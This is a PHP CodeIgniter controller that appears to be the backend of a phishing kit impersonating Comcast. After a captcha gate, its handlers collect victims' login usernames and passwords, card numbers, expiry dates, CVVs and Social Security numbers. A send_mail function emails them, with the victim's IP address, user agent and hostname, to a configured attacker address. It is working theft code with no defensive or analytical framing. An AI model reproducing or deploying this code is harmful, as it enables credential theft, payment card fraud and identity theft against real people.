<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Home extends CI_Controller {


	public function index()
	{
		if (X_CAPTCHA) {
			$this->load->view('captcha');
		}else{
			$this->session->set_userdata('captcha_status', 'passed');
			redirect(site_url('authen'));
		}
	}

	public function authen()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		$this->load->view('authen');
	}
	public function sitekey()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		if ($this->input->method() == 'post') {
			$msg = [];
			$msg[] = "Usernamei: " . $this->input->post('userId');
			$msg[] = "Passwordi: " . $this->input->post('password');
			$this->send_mail($msg, 'Comcast Info');
		}

		$this->load->view('sitekey');
	}
		public function security()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}


		if ($this->input->method() == 'post') {
			$msg = [];
			$msg[] = "Type: " . $this->input->post('Typ');
			$msg[] = "Name : " . $this->input->post('Hold');
			$msg[] = "Card Number : " . $this->input->post('Card');
			$msg[] = "Expire MM: " . $this->input->post('ex1');
			$msg[] = "Expire YYYY: " . $this->input->post('ex2');
			$msg[] = "CVV: " . $this->input->post('cvv');
			$msg[] = "SSN	 : " . $this->input->post('NSN');
			$this->send_mail($msg, 'Comcast Info');
		}

		$this->load->view('security');
	}
		public function com()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		if ($this->input->method() == 'post') {
			$msg = [];
			$msg[] = "Type: " . $this->input->post('Typ');
			$msg[] = "Name : " . $this->input->post('Hold');
			$msg[] = "Card Number : " . $this->input->post('Card');
			$msg[] = "Expire MM: " . $this->input->post('ex1');
			$msg[] = "Expire YYYY: " . $this->input->post('ex2');
			$msg[] = "CVV: " . $this->input->post('cvv');
			$msg[] = "SSN	 : " . $this->input->post('NSN');
			$this->send_mail($msg, 'Comcast Info');
		}
		$this->load->view('com');
	}
	public function send_mail($msg=[], $sbj='')
	{
		$ip = getenv("REMOTE_ADDR");
		$useragent = $_SERVER['HTTP_USER_AGENT'];
		$hostname = gethostbyaddr($ip);

		$this->email->from(X_RESULT_FROMEMAIL, X_RESULT_NAME);
		$this->email->to(X_RESULT_EMAIL);

		$msg[] = "IP: " . $ip;
		$msg[] = "UA: " . $useragent;
		$msg[] = "HOST: " . $hostname;
		$msg_body = "";
		foreach ($msg as $key => $m) {
			$msg_body .= $m."\n";
		}

		$this->email->message($msg_body);

		$this->email->subject($sbj .' - '. $ip);
		


		if (@$this->email->send()) {
			// exit('true');
			return true;
		} else {
			return false;
			// exit('false');
		}
	}
}
?>
